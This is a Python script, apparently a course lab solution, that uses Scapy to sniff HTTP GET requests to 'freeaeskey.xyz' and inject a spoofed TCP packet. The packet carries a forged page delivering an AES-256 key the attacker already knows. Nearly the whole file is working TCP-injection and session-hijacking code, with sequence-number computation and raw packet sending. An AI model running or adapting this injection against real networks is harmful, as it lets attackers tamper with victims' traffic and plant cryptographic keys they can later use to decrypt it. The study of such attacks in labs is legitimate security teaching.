from scapy.all import send, sniff, IP, TCP, Raw, conf, L3RawSocket
import socket


known_aes_key = "4d6167696320576f7264733a2053717565616d697368204f7373696672616765"


target_hostname = "freeaeskey.xyz"
target_ip = socket.gethostbyname(target_hostname)
target_port = 80


attack_payload = (
    "HTTP/1.1 200 OK\r\n"
    "Content-Length: 335\r\n"
    "Content-Type: text/html; charset=UTF-8\r\n"
    "Server: CustomServer\r\n"
    "Connection: close\r\n"										#got the payload from tcpdump
    "\r\n"
    "<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n"
    "<body>\n<h1 style=\"margin-bottom: 0px\">Free AES Key Generator!</h1>"
    "<span style=\"font-size: 5%\">Definitely not run by the NSA.</span><br/>\n"
    "<br/><br/>Your <i>free</i> AES-256 key: <b>{}</b><br/>\n"
    "</body></html>"
).format(known_aes_key)

# Use this function to send packets
def inject_fake_ack(src_ip, dst_ip, sport, dport, seq, ack):
    crafted_packet = IP(src=src_ip, dst=dst_ip) / TCP(
        sport=sport, dport=dport, seq=seq, ack=ack, flags="PA"						#modified the function to take in parameters
    ) / Raw(load=attack_payload.encode())
    
    # Inject the fake ACK packet
    conf.L3socket = L3RawSocket
    send(crafted_packet)
    print("[DEBUG] Injected fake ACK packet with modified AES key.")

# edit this function to do your attack
def handle_pkt(pkt):											#helper function to handle the packets 			
    if IP in pkt and TCP in pkt and pkt[IP].dst == target_ip and pkt[TCP].dport == target_port:
        if Raw in pkt and b"GET" in pkt[Raw].load:
            print("[DEBUG] Intercepted GET request")							#matching the  intercepted packets paramters	
            src_ip = pkt[IP].dst
            dst_ip = pkt[IP].src
            sport = pkt[TCP].dport
            dport = pkt[TCP].sport
            seq = pkt[TCP].ack  
            ack = pkt[TCP].seq + len(pkt[Raw].load)  
            
            inject_fake_ack(src_ip, dst_ip, sport, dport, seq, ack)


def main():
    sniff(filter=f"tcp and dst host {target_ip} and dst port {target_port}", prn=handle_pkt, store=0)

if __name__ == '__main__':
    main()

